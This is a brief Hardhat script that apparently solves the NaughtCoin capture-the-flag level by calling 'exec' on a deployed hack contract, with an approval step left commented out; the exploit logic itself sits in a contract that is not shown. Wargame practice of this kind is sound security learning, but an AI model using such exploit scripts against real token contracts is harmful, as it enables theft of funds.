import { ethers } from "hardhat";
const CHALLENGE_ABI = require('../artifacts/contracts/NaughtCoin.sol/NaughtCoinHack.json').abi
const COIN_ABI = require('../artifacts/contracts/NaughtCoin.sol/NaughtCoin.json').abi

async function main() {
  const signers = await ethers.getSigners()
  const contract = new ethers.Contract("0x33E6BCa4E06fa13E2EF102B78863Fea5D76fFe86", CHALLENGE_ABI, signers[0])
  const coin = new ethers.Contract(await contract.coin(), COIN_ABI, signers[0])
//   await coin.approve(contract.address, ethers.constants.MaxUint256)
  await contract.exec({gasLimit: 1000000})
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});